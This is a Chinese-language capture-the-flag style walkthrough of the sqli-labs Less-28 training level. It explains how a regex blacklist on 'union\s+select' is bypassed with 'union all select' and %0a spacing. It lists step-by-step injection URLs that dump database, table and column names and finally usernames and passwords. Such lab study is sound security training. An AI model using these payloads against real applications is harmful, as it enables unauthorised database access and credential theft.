# Less-28 （union\s+select 词组过滤）

## 查看分析源码
```php
$id= preg_replace('/[\/\*]/',"", $id);              // strip /*
$id= preg_replace('/[--]/',"", $id);                 // --
$id= preg_replace('/[#]/',"", $id);                  // #
$id= preg_replace('/[ +]/',"", $id);                 // 空格和+
$id= preg_replace('/[ +]/',"", $id);                 // 又来一次
$id= preg_replace('/union\s+select/i',"", $id);     // ★ 只拦 union 空格 select
```

和 Less-27 最大的区别：这里只拦 `union\s+select` 这个词组，不是单独拦 `union` 和 `select`

`select` 单独能用，`union` 单独也能用，但不能写在一起中间有空白

但问题是：

```
union select       → 被删（中间有空格）
union%0aselect     → %0a 是 \s，也被删
union ALL select   → 中间有 ALL，不匹配 \s+，安全
union/**/select    → /* / * 被 [\/\*] 干掉，变成 unionselect，不行
```

所以绕过方法就是往中间插个词打断匹配

SQL 语句是 `('$id')`，括号闭合：

```
id=('-1') union all select 1,2,3 or '1'='1' LIMIT 0,1
```

## order by

```
?id=1')%0aorder%0aby%0a3%0aor%0a'1'='1
?id=1')%0aorder%0aby%0a4%0aor%0a'1'='1
```

## 回显位

```
?id=-1')%0aunion%0aall%0aselect%0a1,2,3%0aor%0a'1'='1
```

## 爆库名

```
?id=-1')%0aunion%0aall%0aselect%0a1,database(),3%0aor%0a'1'='1
```

## 爆表名

```
?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0aor%0a'1'='1
```

## 爆列名

```
?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'%0aor%0a'1'='1
```

## 爆数据

```
?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0aor%0a'1'='1
```

总结：`union\s+select` 只拦两个关键字中间带空白的情况，插个 `ALL` 进去就断了。注意 `union%0aselect` 不行——`%0a` 属于 `\s`，反而会被匹配到。用 `union%0aall%0aselect` 就没事。没有报错回显但数据正常时出结果。
